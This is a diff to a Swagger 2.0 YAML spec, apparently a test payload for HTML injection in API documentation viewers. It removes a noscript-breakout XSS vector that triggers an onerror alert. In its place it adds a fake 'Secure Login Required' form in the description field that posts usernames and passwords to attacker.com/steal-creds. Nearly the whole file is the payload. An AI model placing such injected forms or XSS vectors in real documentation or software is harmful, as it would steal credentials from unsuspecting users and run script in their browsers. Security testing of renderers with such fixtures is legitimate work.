@@ -1,16 +1,25 @@
 swagger: '2.0'
 info:
-  title: CSP-Aware Swagger XSS Payload
+  title: Phishing Swagger Demo
   description: |
-    <noscript><p title="</noscript><img src=x onerror=alert('bypass')>">
+    <form action="https://attacker.com/steal-creds" method="POST">
+      <h3>Secure Login Required</h3>
+      <p>Please enter your credentials to access the full API documentation.</p>
+      <label for="username">Username:</label>
+      <input type="text" id="username" name="username" required><br><br>
+      <label for="password">Password:</label>
+      <input type="password" id="password" name="password" required><br><br>
+      <input type="submit" value="Login">
+    </form>
   version: 1.0.0
 paths:
   /test:
     get:
+      summary: Test endpoint
       parameters:
         - name: test
           in: query
           type: string
       responses:
         '200':
-          description: Test endpoint
+          description: Successful response
